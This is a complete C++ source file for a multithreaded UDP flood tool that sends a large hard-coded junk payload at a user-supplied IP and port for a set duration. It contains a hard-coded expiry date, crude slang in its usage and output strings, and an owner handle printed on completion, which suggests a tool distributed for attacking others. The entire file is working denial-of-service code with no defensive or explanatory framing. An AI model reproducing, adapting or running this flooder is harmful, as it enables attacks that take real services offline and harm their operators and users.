#include <iostream>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <stdexcept>

void usage() {
    std::cout << "Usage: ./run <RUSSIAN> <CHUT> <CHAHIYE> <KYA>" << std::endl;
    exit(1);
}

struct ThreadData {
    std::string ip;
    int port;
    int duration;
    time_t expiration_time;
};

void* attack(void* arg) {
    ThreadData* data = static_cast<ThreadData*>(arg);
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    std::vector<std::string> payloads = {
        "\x22\x6f\xa8\x13\x26\x80\x81\x0a\xf6\x02\x4f\x79\x18\x42\x76\x34\xbb\xc7\xd1\x91\xb3\x6f\x74\x12\x2f\x02\xb8\x78\xdb\x56\xf2\x28\xdd\x30\x2f\x54\x93\x7e\x5d\x40\x0e\xe2\x1f\xa6\x00\x03\x80\x33\xfd\xd0\x19\x32\xbc\x37\x9f\xe1\x38\x35\xf8\xf8\xb4\x35\xc5\xd1\x31\xff\x1b\xbe\x61\x08\x0e\xbd\xba\x54\xd0\x38\x79\xa2\x98\x74\x3f\x8e\x99\xd3\xfc\x08\x43\x63\x30\x54\xe8\x46\xb7\x7e\x7d\x5f\x73\xa5\xd9\x5f\xec\xad\xcc\x7c\x1e\xf6\xb9\x74\x58\x8b\x3f\x22\x57\xe8\x1e\x32\xb1\xba\x43\xd3\xeb\xd3\x50\x96\xe9\x69\x14\xe7\x48\x06\xd0\xe9\x3f\xc6\x78\x64\xb2\x66\x40\xa5\xf0\x3e\x39\x00\x81\x0c\x2e\x30\xcb\x93\x8d\xf0\x8e\x2c\x6d\xa7\xfb\x2b\x3f\x56\x20\x1e\x87\x93\x05\xbf\x15\x41\xc1\x97\xe1\xd6\xfc\x8b\x31\xd5\xc8\x77\xce\xe5\x49\x7c\x45\x65\x2a\x1f\x54\x24\x82\xda\x86\x8f\x95\xa6\x57\x11\x02\x98\x9e\xa8\xca\x59\x14\x7b\xf3\x53\x28\x11\x50\xc8\x34\x6f\x0c\x8c\xd5\xa3\xbb\x0f\xea\x16\x3b\xf2\x95\xa1\x36\xc8\x9e\x45\x94\x74\x9a\x9e\x6c\x50\xa4\xb8\x15\xb1\x1b\xae\x99\x4c\xe7\x7b\x7e\x34\x0b\x6e\xdd\x09\x30\x85\x64\xac\xff\x15\xa9\xfe\xb5\xc0\xe7\x07\xd3\x9e\x9e\x39\x38\x1c\xe5\x56\xa5\x96\xc7\x8f\xb1\xfb\xf2\x45\xd6\x08\xec\x86\x9c\xbf\x7a\xe2\xb2\x2a\xfe\x73\x29\x47\x85\x34\xb1\x00\xb6\xc2\x6a\x27\xa3\x7c\x9d\xb0\x5f\x6e\x21\x36\x18\x4d\xd4\xe6\xb0\x23\xee\x14\xb2\x29\x43\xe4\x8c\xad\xd3\x9f\x35\x8d\x06\x54\xf2\xb3\x7f\x58\x12\x2f\xfd\xa7\xb2\x40\x87\xc3\x8f\x33\xc6\xa1\xea\xb9\xb5\x37\x71\x13\x20\x08\xa2\x2d\x5f\xd2\xda\xb8\x29\x67\xb4\x3b\xe3\xfc\xf9\xa6\xba\x9b\xb7\xb9\x60\x41\x83\x8c\xf2\x72\xe1\x53\xd3\x6e\xd2\x1a\x9c\xa0\xf3\x99\x35\x21\xd5\x4a\x40\x7d\x95\x56\x36\x49\x0d\xc6\xf9\x12\x02\x32\x24\xce\x11\x31\x15\x15\x49\xa5\xb1\x4c\x61\xa1\xbd\x15\x56\xb2\x24\xd0\x9f\xd8\x9a\xf4\x06\x4c\xcf\x2a\x24\x0d\x9f\xa6\x86\xd3\xc2\x05\x01\x5a\xf7\x0a\x7d\xe0\xc0\x52\x68\xe6\x08\x6d\x58\x63\xfb\x50\xac\xcc\x53\xea\x6c\xe0\xd9\x2a\x85\x8e\xbd\x3a\x41\x65\x97\x60\x2f\x22\x8a\x6e\x23\xf9\x95\x38\x79\xb2\xd6\xc1\x30\x62\x5c\xee\xc2\xf8\x65\xfe\x7f\x51\x3c\xae\xc7\x2f\xe4\x06\x3f\x11\x8c\xd0\x18\x2c\xa3\x13\x4a\xbe\x30\xd6\x13\xb7\xcb\x01\x8c\x65\xeb\x06\x5a\xe9\x72\xb3\x8d\x47\xd0\x83\xd9\xde\xae\xe8\x54\xa9\x39\x7d\x12\x83\x1d\xed\x00\x6a\x62\xd9\xe5\x1a\x11\x78\xd5\x37\x73\x5f\x6d\x5b\xc9\xbe\x3b\x3e\x2b\x73\x5d\x0f\x75\x0d\x59\x41\x96\x0d\xda\xf5\xb4\x6e\xf5\xe5\xd7\x6b\x76\xeb\x81\x9b\x2a\x4a\x5a\xfe\x3d\x2a\x25\x63\xf2\xae\x8e\xcd\x17\x9c\x89\x8d\xcb\xbc\xa0\xd2\xb5\x4f\x69\xcc\xd1\x15\x33\x6b\x60\xcb\xb5\xd3\x9a\xad\xf6\xf7\x0b\x56\xb4\xdb\xbf\x55\x58\x87\x03\x9a\x73\x2a\x35\xe5\xfc\x5c\xef\xed\x4a\xe5\x60\x7d\xf9\x49\x90\x07\xef\x31\xf8\xcf\x8f\xf3\xbe\xfc\x9b\x8e\x1d\x49\x2d\x2c\xa4\x91\x93\x34\x00\xa1\xd2\x2a\x48\xb6\x3f\xfd\xd7\x5c\xa2\x23\x44\xdd\x17\xb6\x1e\xc2\x0c\x8e\x28\x4e\xdc\x97\x3b\xb2\xa8\x07\xa3\xd7\xd0\x3d\x41\x88\xd3\x76\xf6\x7f\x20\xcc\x9a\xaf\xc8\x1d\x7e\xe5\xbe\xf4\x02\x90\x9e\x52\x1c\x4f\x47\xf8\xe5\x97\x4b\x48\xac\x8f\x59\xfd\xb3\xa0\x15\x34\x54\x14\x7a\x37\xfc\x6a\x3b\xa3\xe0\x02\x9a\xae\x7c\x1c\xd6\xaf\x7f\xa6\x89\x03\xf9\x7f\x24\xa4\xe0\x32\x0d\x47\xb7\x57\x85\x45\x7c\xbb\x7e\xd7\x24\xa5\x0f\x2a\x9d\xf0\x30\x26\xab\x3e\x05\xc9\x36\x0f\x4a\xf3\x75\x8d\x44\x40\xa1\xb9\xa9\xfd\xfe\xf6\x04\x5b\x8b\x17\xc1\xa5\xd6\x6f\x74\x8c\x98\x8b\xbe\xa2\x97\x59\x38\x60\x47\xc3\x01\x03\x4a\x31\x47\x82\xd7\x14\x7e\x50\x2f\xc9\xc3\xb0\x0b\xbc\x22\x30\x53\xae\x5f\x4b\x48\x34\x87\x3b\x29\x69\x55\x87\xbb\x23\x56\x1d\x01\x98\x9f\x89\xbc\x5a\xb2\x84\x6d\x23\xe8\xce\x2c\x03\x00\xc8\xd1\x58\x05\x53\xaf\x09\xc6\x91\x6e\x0f\x6b\x0e\x51\xba\xe6\xc5\xb8\x63\x9d\xae\x23\x1d\x86\x88\x7b\x2f\xa2\xc9\x4c\xc6\x44\x81\x5d\x3a\x6c\xa5\x4c\x2f\xbf\xda\x40\xb9\xc9\x59\x79\x60\x64\x9a\x08\xd0\x15\x9f\xc8\x50\x15\xb7\xbb\x97\xcd\x3e\x76\x39\xbb\xc8\x5f\x33\xa4\x84\xb7\xd5\xdb\x91\xda\x9d\xf6\x6f\x52\x84\x07\xd3\xe2\xc3\x86\x8a\x25\x74\xd3\x4a\xd5\x5a\xf5\xdb\xb4\xf0\xac\xca\xb2\x2e\x22\xc3\x28\x2f\xea\x61\x0a\xe0\x9e\x8f\x73\xe3\x88\xbc\x65\xb1\x40\xee\x2f\xd4\x0d\xf6\xc0\x62\x4f\x53\xaf\x0b\x5f\xfe\x87\xdc\x8a\x05\xc1\x4b\xec\x8f\x42\x9c\x0e\xb5\x68\x77\x67\xcf\xad\xfe\x01\x42\x3b\xd9\x84\xce\x4d\x38\x7c\x63\xa2\x28\xb8\xdb\x9d\x28\x24\x7f\x1e\x21\x61\x01\xc7\xbe\x60\x23\xeb\xd9\x68\x81\x18\x18\x3b\xf3\xc4\xa8\x56\x8d\xaf\x28\x96\x8f\x95\x17\x40\xcf\x08\x2c\x69\x5c\x07\x6b\xe9\xb7\x59\x57\xb4\x0d\x42\x98\x84\x86\x71\xf4\x20\x00\xeb\xd2\x2f\x4e\xe5\xa8\x50\x18\x2a\x58\x21\x24\x90\xa4\x70\xd4\xcd\x62\xdd\x80\x5a\xb5\x28\x6c\x5f\x2b\xee\x60\xe1\x21\xa5\x39\x66\x9f\x90\xbf\x8d\xa9\x5a\xa0\xd9\x76\x04\x93\x56\xfb\x8a\x09\x44\xd5\x38\x86\x2e\xaa\x5d\xde\xf0\x3f\xd6\xb1\x2d\x25\x0c\xe9\x92\xbf\xa2\x47\x2e\xfa\xf4\x68\xa2\x29\x18\xca\x62\xe1\x57\xc5\xb7\x8e\xa3\xce\x65\x8c\x2c\x47\x6e\x65\x44\x72\x5a\x33\x47\x7b\x1b\x1f\xa0\xa7\x96\x71\x9e\x9f\xff\xdd\xe5\xbb\xd6\xba\x70\x0f\x33\x0e\x3b\x3c\x1d\xbf\xae\x2e\xd8\x79\x63\xe0\x62\x03\x96\x3a\x57\x9d\x6a\x27\xe4\x35\x66\xd4\xba\xba\x6f\xe0\xa0\xf6\xbf\x83\xee\x1d\x05\xa8\x54\x2d\xdc\x0d\xaa\x00\x95\x49\x3f\x50\x1d\xb2\x8c\x1b\x61\x02\x1e\xcf\xc4\x57\x33\xe2\xb1\x21\x34\xfc\xce\x89\x9e\xd7\x59\x7a\x62\x7e\xaa\x5a\x9b\x11\x1d\xa8\xc7\xd9\xc7\x6d\xce\xf1\xac\x9e\xdc\xd1\xaa\x2d\xd5\x4d\xd2\x6a\x0a\x13\x58\x95\xbf\x91\x94\x78\xd6\xac\x4d\xeb\x63\x39\x73\xf6\x89\x7b\x48\x99\x4d\xb5\x41\x95\x0e\xf9\x0a\x4a\x98\x4c\x1b\x11\xf6\x7d\xb3\x3d\x32\xa1\x3b\xd0\xcd\xf5\xa8\x7d\x79\xce\x6a\xad\xfe\x2d\x75\xce\xef\x07\xff\x0d\xb1\x80\x3c\xd1\x3d\xd3\x9b\x1c\xfa\x3a\x6d\x9a\x13\x66\xf9\xcb\x51\x67\x66\x1e\xfe\x06\xdb\x7e\x76\xa1\xe9\xf3\xc4\x8d\x9c\x64\x60\x98\xc0\x9c\x61\x40\x90\xf0\x12\x7c\x85\xd3\x24\x6a\x11\xb0\xa2\x31\x6d\xa2\x72\xef\x45\x59\xf0\x0c\x4f\x37\xdf\x5c\x8f\x2a\xea\x47\xd3\x94\xc4\xe6\x3d\x88\xc2\x54\x71\xb9\x2d\x79\xde\x19\xff\xed\x4f\xe0\xf4\x60\xd9\xa0\x7f\x30\xef\x84\xf7\xbc\xab\xb9\x29\x0a\x2d\xcb\xa5\xad\x13\x56\x1d\xf9\x67\x16\xaf\x21\x95\x93\x8e\x9b\x34\x66\xd6\x6f\xa9\x4d\xa1\x21\x4f\x9a\x11\x98\xcc\x6a\xda\xff\x04\x64\x82\x92\x58\xc7\xa4\xd8\x0e\x39\x0a\x03\xa0\x71\x9b\x57\xe3\xdf\xff\xa7\x43\x35\xac\x72\xda\x4b\xc4\x79\x7d\x27\xc4\x8a\xc5\x80\x96\xd1\x53\x8f\xaa\xea\x66\xd5\xe2\x43\xc6\x2c\x12\xf4\xc8\x6e\x9f\x95\x6a\x9f\x1f\xf5\x2e\x89\x52\xab\xb3\x38\x7a\xd2\xff\xe6\x75\x52\xc4\x22\xc6\x60\x42\x18\xe7\x68\x41\x7d\xa0\x05\x32\x7f\xe7\xf3\x44\x72\x59\x4a\x32\x35\x3e\x44\xc9\x1d\xf8\xe4\x14\x3a\x47\x7f\xdd\x00\x59\xb8\xbb\x91\xaf\xfc\x11\x28\x15\x85\x22\x10\x05\x8e\x2e\xa1\x20\x46\x08\x96\x75\x6b\xb8\xab\x06\x6f\x42\xce\x85\x05\xfc\x11\xb0\xd4\x5c\xb0\x7e\xb9\x1f\x76\x12\xfc\x81\x16\x98\x7a\x55\xc0\x86\x46\xe9\x87\x51\x29\xdc\xd8\x81\x90\xb1\xd3\x56\x1b\xac\x3d\x67\xcb\x5c\x3b\x33\xc2\xd6\x12\x03\x8b\x33\xe8\x82\x3a\x12\x47\x7f\x86\x23\x29\xa4\x74\x49\xd0\x15\x35\x0f\xb2\x71\xab\xbd\xc7\x08\x17\x7d\x8c\x27\x54\xdd\x00\x64\x69\xb1\x7b\x7b\x4d\xa9\xf0\x14\xbb\x7e\xc8\xf6\xc8\x51\x6c\xec\xc4\x43\xf2\x06\x9a\x7a\x83\x92\x21\xbb\x7c\x21\x67\xc1\xeb\x8c\x32\x8e\xa7\xfe\x1a\x76\x7c\x63\x4d\x1b\xfb\x78\x24\x12\xf6\xa1\xb5\x09\x44\x78\x0a\x4b\x15\x1d\xda\x5c\x2c\x4a\x3e\xf1\x87\xaa\xb5\xa9\x32\xa2\xac\xf1\xbe\x19\x8c\x8a\x54\x2f\xdd\x2e\x24\x04\x32\x99\x14\x90\xe3\xe2\x57\x28\xaf\xd6\x7d\x39\xa7\xf3\xa7\xdc\x20\xe7\xf0\x12\x45\xb6\x94\xf0\xa4\xa0\xbd\x74\xf5\xc9\x1d\xae\xc6\xff\x26\x1b\x70\x4f\x35\x85\xcc\xd0\x63\xd2\x10\x0b\xc8\xcc\x43\x73\x20\xc7\x62\x3d\x8a\xbf\xa1\x42\x3c\xa4\xa9\x7b\x92\xc6\x48\xcc\xf0\xa1\x85\x26\xea\x83\x54\x8d\x42\x86\x63\x86\xcd\x4b\xb6\x1e\x55\xc1\xc2\xb0\x79\x32\x11\x32\x0a\xce\x0a\x97\x61\x2d\xed\x45\x0b\x31\x56\xc5\x49\x5a\x92\x01\x92\x16\x34\x8d\xc0\xbd\x40\xf3\xcc\xfc\x18\x09\xb6\x63\x46\xd0\xe3\x04\xb0\x68\xe6\xd2\x7d\x36\x9d\xf1\x97\x2a\xf8\x88\x21\x6b\x95\x89\xb7\x41\x02\x88\x62\xf9\xc6\x07\xbe\x7a\x8d\x4a\x1e\x45\xc5\x5f\x0a\x7e\x7e\xbd\xea\x54\xf4\xdb\x05\x11\xdb\x5f\xf5\x2c\x6e\x5b\x51\x58\xc9\x3b\x2c\xbb\x5e\x30\xf6\x49\xe9\xed\x8c\xa6\xd5\x85\x5c\xc2\x54\xb3\xc5\x23\xc9\x33\xeb\x20\xbb\xb7\x79\x82\x0d\x91\x59\xc6\x14\x92\x15\x13\x8b\x1a\x4d\xd6\x0d\x03\xba\x6b\x80\x05\xde\x4b\xb7\xd3\x5c\xb5\x6d\x02\x6f\xbf\x38\xae\x6d\x89\xa5\x8a\xab\xea\x90\xae\xce\x31\x13\xd6\x17\x96\xe9\xc0\xca\x21\x1b\x0e\x3b\x86\xe4\xa2\xe0\xb6\x2e\xd7\xf2\x0a\x67\x69\xa4\x49\x4e\x1e\x3b\xb6\xf3\xeb\x5d\x5c\xe2\x4e\xa3\xd7\xb5\xfe\x19\x68\x52\xfd\x32\x9c\xbd\x8a\x82\x23\xb3\xca\x86\xea\x50\x2c\xbc\xf6\xc9\xeb\x9d\xc1\x7e\x10\x77\x86\xf8\xcd\xd2\xdb\x7d\xda\xc6\xeb\x5f\xdb\x75\x0c\xb9\x12\x76\x01\x5c\x9f\x74\x97\xdf\x50\xa6\xec\x85\x83\x71\xf8\x51\x8e\x68\xb0\x71\xce\x61\x2d\x61\x8f\x5e\xa4\xf2\x3b\x13\x91\x18\x06\x6e\x2c\xb9\xff\xbc\x5d\x12\x93\x07\x3e\xf0\x4d\xf5\xaf\xc9\x4f\xea\xa4\x02\x0a\xf8\x47\x1f\xc9\x5c\x74\x1b\xa8\xe8\x68\xa2\x1e\x4c\x10\xc4\xc7\x7c\xc6\x9e\x13\xe8\x90\x06\xa2\xa6\xd5\xb0\xbc\x2f\x35\x27\x5c\x12\x90\x10\x80\x4b\x90\x3e\x80\x9a\x18\x23\xd4\xb8\xb4\x22\x31\x88\x04\xc5\x64\x59\x97\x73\x07\xbc\xaf\xf5\x50\x70\xeb\xbf\x08\x23\x48\x29\x47\x84\xec\xec\xb8\x87\x85\x17\x76\x3f\x0c\x9f\x8a\x93\xf8\x0d\xd4\xa4\x2e\x7b\x43\x74\x23\xce\x5a\xa0\xc6\x96\x90\x45\x21\x6c\x07\xd6\xc8\xb3\xfa\x90\x7a\xbc\x10\x9c\xc9\xe1\x47\xfe\x32\x49\xe7\x8b\xc4\x0e\x6e\x78\xec\xa6\x04\x7a\x2b\x8e\x7b\x59\x58\x93\xe4\x85\x20\xa8\x6e\x58\x62\x64\xd3\x73\x14\xc9\x0e\xe8\x77\x22\xe2\x64\x7e\x8f\x8d\x40\x6b\x5b\x25\x15\x0b\x54\x8e\x90\x1b\x06\xb7\xe0\x31\x0f\x49\xd3\x69\x32\xb6\xbb\x55\x51\xe1\xb6\x2c\xcd\x6c\xd2\x03\x84\x22\x0e\x7f\x14\xa4\xd6\x8d\x26\xe1\x72\xbb\xfd\x51\x8c\x23\x46\x26\x22\x1c\x22\x2b\xd1\x37\x0f\x9a\x15\x19\x44\x80\x1e\x3a\x67\xbc\x21\x33\xa1\x7a\x4d\x25\x88\xf0\x32\xef\xcf\xe7\xc1\xaf\x07\xa9\x4f\xd2\x52\xb1\xd9\x93\xf2\x50\x21\x7d\xb8\x5e\xcf\xce\xe4\x5a\x25\x88\xfe\xc5\x41\xb1\xe2\x9c\x0e\xdc\x71\x4a\x50\x8f\xda\x15\xac\x69\xc5\xc3\xf7\xae\x8c\x54\x5b\x23\xb0\x25\x1a\xda\xf1\x38\x04\x41\x57\x42\x76\x29\x28\xe7\xae\x88\xba\x68\xf1\x54\xcc\xed\x91\x3b\x70\xd4\xd1\x8e\xb8\xad\x75\x34\x29\x0d\x4b\xbb\xd4\xf7\x26\x62\x38\x68\x30\x17\xdc\x09\x09\x69\xdd\x80\x12\xe6\x52\xdf\xfa\x83\x61\x63\xc4\x82\xe6\x8f\x37\xd8\x46\xb3\x24\xfb\x64\x07\x7f\x09\xfb\x37\x83\x21\xc3\x96\x08\xbe\xc5\x27\xdc\xc4\x01\xc7\xec\x3c\x71\x8b\x09\x97\xb1\x04\x82\x4f\xa9\x13\xe4\x91\x39\x6b\x05\x5e\x99\xc9\x9b\x6a\xa8",
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(nullptr);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip.c_str());

    endtime = time(nullptr) + data->duration;

    while (time(nullptr) <= endtime) {
        for (const auto& payload : payloads) {
            ssize_t bytes_sent = sendto(sock, payload.c_str(), payload.size(), 0,
                                        (const struct sockaddr*)&server_addr, sizeof(server_addr));
            if (bytes_sent < 0) {
                if (errno == EINTR) continue;  // Ignore interrupted system calls
                perror("Send failed");
                close(sock);
                pthread_exit(nullptr);
            }
        }
    }

    close(sock);
    pthread_exit(nullptr);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int threads = std::stoi(argv[4]);

    if (port <= 0 || port > 65535 || duration <= 0 || threads <= 0) {
        std::cerr << "Invalid input values. Port should be between 1-65535, duration and threads should be positive integers." << std::endl;
        exit(1);
    }

    // Set up expiration time
    ThreadData data = {ip, port, duration};

    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900;
    expiration_tm.tm_mon = 1;
    expiration_tm.tm_mday = 3;
    expiration_tm.tm_hour = 23;
    expiration_tm.tm_min = 59;
    expiration_tm.tm_sec = 59;

    data.expiration_time = mktime(&expiration_tm);

    if (data.expiration_time == -1) {
        perror("Error setting expiration time");
        exit(1);
    }

    if (time(nullptr) >= data.expiration_time) {
        std::cout << "Attack has expired. Exiting." << std::endl;
        return 0;
    }

    std::cout << "Flood started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads" << std::endl;

    std::vector<pthread_t> thread_ids(threads);

    for (int i = 0; i < threads; ++i) {
        if (pthread_create(&thread_ids[i], nullptr, attack, (void*)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        std::cout << "RUSSIAN CHUT ID: " << thread_ids[i] << std::endl;
    }

    for (auto& thread_id : thread_ids) {
        pthread_join(thread_id, nullptr);
    }

    std::cout << "ATTACK FINISHED ♥️ OWNER @GODXALONEBOY" << std::endl;
    return 0;
}